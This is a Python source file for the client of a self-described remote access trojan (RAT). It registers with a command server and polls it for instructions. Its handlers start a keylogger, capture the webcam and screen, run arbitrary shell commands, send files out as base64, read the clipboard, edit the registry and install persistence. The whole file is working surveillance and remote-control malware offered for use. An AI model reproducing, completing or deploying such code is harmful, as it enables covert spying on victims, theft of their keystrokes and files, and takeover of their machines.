#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import uuid
import json
import base64
import socket
import platform
import requests
import threading
import logging
from datetime import datetime
from typing import Dict, Any, Optional

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Placeholder imports - these should exist in your project structure
try:
    from client.modules.system_info import SystemInfo
    from client.modules.process import ProcessManager
    from client.modules.file_manager import list_directory, download_file, upload_file
    from client.modules.screenshot import ScreenCapture
    from client.modules.webcam import WebcamManager
    from client.modules.keylogger import Keylogger
    from client.modules.shell import ShellExecutor
    from client.modules.clipboard import get_clipboard, set_clipboard
    from client.modules.persistence import Persistence
    from client.modules.network import NetworkMonitor
    from client.utils.registry import registry_handler
    
    MODULES_AVAILABLE = True
except ImportError as e:
    MODULES_AVAILABLE = False
    logging.error(f"Required modules not found: {e}")
    raise

# Setup logging
log_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'logs')
os.makedirs(log_dir, exist_ok=True)
logging.basicConfig(
    filename=os.path.join(log_dir, 'client.log'),
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

class RatClient:
    """Client for the RAT system"""
    
    def __init__(self, server_url: str, heartbeat_interval: int = 30):
        """Initialize the RAT client
        
        Args:
            server_url: URL of the RAT server
            heartbeat_interval: Interval between heartbeats in seconds
        """
        if not MODULES_AVAILABLE:
            raise RuntimeError("Required modules not available")
            
        self.server_url = server_url.rstrip('/')
        self.heartbeat_interval = heartbeat_interval
        self.client_id = self._get_client_id()
        self.running = False
        
        # Initialize modules
        self.process_manager = ProcessManager()
        self.system_info = SystemInfo()
        self.screen_capture = ScreenCapture()
        self.webcam = WebcamManager()
        self.keylogger = Keylogger()
        self.shell = ShellExecutor()
        self.persistence = Persistence()
        self.network = NetworkMonitor()
        
        # Command handlers
        self.command_handlers = {
            'system_info': self._handle_system_info,
            'process_list': self._handle_process_list,
            'file_explorer': self._handle_file_explorer,
            'screenshot': self._handle_screenshot,
            'webcam': self._handle_webcam,
            'keylogger': self._handle_keylogger,
            'shell': self._handle_shell,
            'download': self._handle_download,
            'upload': self._handle_upload,
            'execute': self._handle_execute,
            'clipboard': self._handle_clipboard,
            'persistence': self._handle_persistence,
            'network': self._handle_network,
            'registry': self._handle_registry,
            'kill': self._handle_kill
        }
    
    def _get_client_id(self) -> str:
        """Get or generate a unique client ID
        
        Returns:
            str: Client ID
        """
        id_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), '.client_id')
        
        try:
            if os.path.exists(id_file):
                with open(id_file, 'r') as f:
                    client_id = f.read().strip()
                    if client_id:
                        return client_id
        except Exception as e:
            logging.error(f"Error reading client ID: {e}")
        
        # Generate and save new ID
        client_id = str(uuid.uuid4())
        try:
            with open(id_file, 'w') as f:
                f.write(client_id)
            logging.info(f"Generated new client ID: {client_id}")
        except Exception as e:
            logging.error(f"Error saving client ID: {e}")
        
        return client_id
    
    def start(self) -> None:
        """Start the RAT client"""
        if self.running:
            logging.warning("Client already running")
            return
            
        self.running = True
        
        # Register with server
        self._register()
        
        # Start heartbeat thread
        heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        heartbeat_thread.start()
        
        logging.info(f"RAT client started with ID: {self.client_id}")
    
    def stop(self) -> None:
        """Stop the RAT client"""
        if not self.running:
            return
            
        self.running = False
        
        # Stop modules
        if self.keylogger.running:
            self.keylogger.stop()
        if self.screen_capture.recording:
            self.screen_capture.stop_recording()
        if self.webcam.streaming:
            self.webcam.stop_stream()
        if self.network.monitoring:
            self.network.stop_monitoring()
        
        logging.info("RAT client stopped")
    
    def _register(self) -> None:
        """Register with the server"""
        system_info = self.system_info.get_all_info()
        
        data = {
            'id': self.client_id,
            'hostname': socket.gethostname(),
            'ip_address': socket.gethostbyname(socket.gethostname()),
            'os': f"{system_info['basic']['platform']} {system_info['basic']['platform_release']}",
            'username': system_info['basic']['username'],
            'admin_rights': os.getuid() == 0 if platform.system() != 'Windows' else None,  # Windows TBD
            'av_software': [],  # Implement AV detection if needed
            'system_info': system_info
        }
        
        try:
            response = requests.post(f"{self.server_url}/api/client/register", json=data, timeout=10)
            if response.status_code == 200:
                logging.info("Registered with server successfully")
            else:
                logging.error(f"Failed to register with server: {response.status_code} - {response.text}")
        except requests.RequestException as e:
            logging.error(f"Error registering with server: {e}")
    
    def _heartbeat_loop(self) -> None:
        """Send heartbeats to the server and check for commands"""
        while self.running:
            try:
                self._send_heartbeat()
            except Exception as e:
                logging.error(f"Error in heartbeat: {e}")
            time.sleep(self.heartbeat_interval)
    
    def _send_heartbeat(self) -> None:
        """Send a heartbeat to the server and process any pending commands"""
        try:
            response = requests.post(
                f"{self.server_url}/api/client/heartbeat/{self.client_id}",
                timeout=10
            )
            
            if response.status_code == 200:
                commands = response.json().get('commands', [])
                for command in commands:
                    self._process_command(command)
            else:
                logging.error(f"Heartbeat failed: {response.status_code} - {response.text}")
        except requests.RequestException as e:
            logging.error(f"Error sending heartbeat: {e}")
    
    def _process_command(self, command: Dict) -> None:
        """Process a command from the server
        
        Args:
            command: Command to process
        """
        command_id = command.get('id')
        command_type = command.get('command')
        params = command.get('params', {})
        
        if not command_id or not command_type:
            logging.error(f"Invalid command format: {command}")
            return
            
        if command_type not in self.command_handlers:
            self._send_command_result(command_id, 'error', {'message': f"Unknown command: {command_type}"})
            return
        
        logging.info(f"Processing command: {command_type} (ID: {command_id})")
        
        # Execute command in a separate thread
        threading.Thread(
            target=self._execute_command,
            args=(command_id, command_type, params),
            daemon=True
        ).start()
    
    def _execute_command(self, command_id: str, command_type: str, params: Dict) -> None:
        """Execute a command
        
        Args:
            command_id: Command ID
            command_type: Command type
            params: Command parameters
        """
        try:
            handler = self.command_handlers[command_type]
            result = handler(params)
            self._send_command_result(command_id, 'success', result)
        except Exception as e:
            logging.error(f"Error executing command {command_type}: {e}")
            self._send_command_result(command_id, 'error', {'message': str(e)})
    
    def _send_command_result(self, command_id: str, status: str, result: Dict) -> None:
        """Send command result to the server
        
        Args:
            command_id: Command ID
            status: Command status (success, error)
            result: Command result
        """
        try:
            data = {
                'status': status,
                'result': result,
                'timestamp': datetime.now().isoformat()
            }
            
            response = requests.post(
                f"{self.server_url}/api/client/command/{command_id}",
                json=data,
                timeout=10
            )
            
            if response.status_code != 200:
                logging.error(f"Failed to send command result: {response.status_code} - {response.text}")
            else:
                logging.info(f"Sent result for command {command_id}: {status}")
        except requests.RequestException as e:
            logging.error(f"Error sending command result: {e}")
    
    # Command Handlers
    def _handle_system_info(self, params: Dict) -> Dict:
        """Handle system info command"""
        return self.system_info.get_all_info()
    
    def _handle_process_list(self, params: Dict) -> Dict:
        """Handle process list command"""
        return {'processes': self.process_manager.get_process_list()}
    
    def _handle_file_explorer(self, params: Dict) -> Dict:
        """Handle file explorer command"""
        path = params.get('path', os.path.expanduser('~'))
        try:
            return {'path': path, 'items': list_directory(path)}
        except Exception as e:
            return {'message': f"Error listing directory: {str(e)}"}
    
    def _handle_screenshot(self, params: Dict) -> Dict:
        """Handle screenshot command"""
        monitor_index = params.get('monitor_index')
        try:
            screenshot = self.screen_capture.take_screenshot(monitor_index)
            if screenshot:
                return {'image': base64.b64encode(screenshot).decode('utf-8')}
            return {'message': 'Failed to capture screenshot'}
        except Exception as e:
            return {'message': f"Error capturing screenshot: {str(e)}"}
    
    def _handle_webcam(self, params: Dict) -> Dict:
        """Handle webcam command"""
        camera_index = params.get('camera_index', 0)
        try:
            image = self.webcam.capture_webcam(camera_index)
            if image:
                return {'image': base64.b64encode(image).decode('utf-8')}
            return {'message': 'Failed to capture webcam image'}
        except Exception as e:
            return {'message': f"Error capturing webcam: {str(e)}"}
    
    def _handle_keylogger(self, params: Dict) -> Dict:
        """Handle keylogger command"""
        action = params.get('action', 'status')
        
        try:
            if action == 'start':
                if not self.keylogger.running:
                    self.keylogger.start()
                return {'status': 'started'}
            elif action == 'stop':
                if self.keylogger.running:
                    self.keylogger.stop()
                return {'status': 'stopped'}
            elif action == 'logs':
                logs = self.keylogger.get_logs()
                return {'logs': logs}
            return {'status': 'running' if self.keylogger.running else 'stopped'}
        except Exception as e:
            return {'message': f"Error handling keylogger: {str(e)}"}
    
    def _handle_shell(self, params: Dict) -> Dict:
        """Handle shell command"""
        command = params.get('command')
        if not command:
            return {'message': 'No command specified'}
        
        try:
            result = self.shell.execute_command(command, shell=True)
            return {
                'command': command,
                'output': result.get('stdout', ''),
                'error': result.get('stderr', ''),
                'exit_code': result.get('exit_code', -1)
            }
        except Exception as e:
            return {'message': f"Error executing shell command: {str(e)}"}
    
    def _handle_download(self, params: Dict) -> Dict:
        """Handle download command (server downloads file from client)"""
        file_path = params.get('file_path')
        if not file_path or not os.path.exists(file_path):
            return {'message': f"File not found: {file_path}"}
        
        try:
            file_data = download_file(file_path)
            return {
                'file_name': os.path.basename(file_path),
                'file_path': file_path,
                'file_size': len(file_data),
                'file_type': os.path.splitext(file_path)[1],
                'file_data': base64.b64encode(file_data).decode('utf-8')
            }
        except Exception as e:
            return {'message': f"Error downloading file: {str(e)}"}
    
    def _handle_upload(self, params: Dict) -> Dict:
        """Handle upload command (server uploads file to client)"""
        file_path = params.get('file_path')
        file_data = params.get('file_data')
        
        if not file_path or not file_data:
            return {'message': 'Missing file path or data'}
        
        try:
            upload_file(file_path, base64.b64decode(file_data))
            return {'message': f"File uploaded to {file_path}"}
        except Exception as e:
            return {'message': f"Error uploading file: {str(e)}"}
    
    def _handle_execute(self, params: Dict) -> Dict:
        """Handle execute command"""
        file_path = params.get('file_path')
        if not file_path or not os.path.exists(file_path):
            return {'message': f"File not found: {file_path}"}
        
        try:
            if platform.system() == 'Windows':
                os.startfile(file_path)
            else:
                subprocess.Popen(['xdg-open', file_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return {'message': f"Executed {file_path}"}
        except Exception as e:
            return {'message': f"Error executing file: {str(e)}"}
    
    def _handle_clipboard(self, params: Dict) -> Dict:
        """Handle clipboard command"""
        action = params.get('action', 'get')
        data = params.get('data')
        
        try:
            if action == 'get':
                content = get_clipboard()
                return {'content': content}
            elif action == 'set' and data:
                set_clipboard(data)
                return {'message': 'Clipboard content set'}
            return {'message': 'Invalid clipboard action'}
        except Exception as e:
            return {'message': f"Error handling clipboard: {str(e)}"}
    
    def _handle_persistence(self, params: Dict) -> Dict:
        """Handle persistence command"""
        action = params.get('action', 'check')
        methods = params.get('methods', ['HKCU', 'folder'])
        executable = params.get('executable', sys.executable)
        
        try:
            if action == 'check':
                return self.persistence.check_persistence()
            elif action == 'add':
                return self.persistence.add_persistence(executable, methods)
            elif action == 'remove':
                return self.persistence.remove_persistence(methods)
            return {'message': 'Invalid persistence action'}
        except Exception as e:
            return {'message': f"Error handling persistence: {str(e)}"}
    
    def _handle_network(self, params: Dict) -> Dict:
        """Handle network command"""
        try:
            return self.network.get_connections()
        except Exception as e:
            return {'message': f"Error getting network info: {str(e)}"}
    
    def _handle_registry(self, params: Dict) -> Dict:
        """Handle registry command"""
        action = params.get('action')
        key = params.get('key')
        value_name = params.get('value_name')
        value = params.get('value')
        
        try:
            return registry_handler(action, key, value_name, value)
        except Exception as e:
            return {'message': f"Error handling registry: {str(e)}"}
    
    def _handle_kill(self, params: Dict) -> Dict:
        """Handle kill process command"""
        pid = params.get('pid')
        if not pid:
            return {'message': 'No process ID specified'}
        
        try:
            if self.process_manager.kill_process(int(pid)):
                return {'message': f'Process {pid} killed successfully'}
            return {'message': f'Failed to kill process {pid}'}
        except ValueError:
            return {'message': 'Invalid PID format'}
        except Exception as e:
            return {'message': f"Error killing process {pid}: {str(e)}"}

if __name__ == "__main__":
    # Example usage
    server_url = "http://localhost:5000"  # Replace with your server URL
    client = RatClient(server_url)
    
    try:
        client.start()
        while True:
            time.sleep(1)  # Keep main thread alive
    except KeyboardInterrupt:
        client.stop()
        logging.info("Client stopped by user")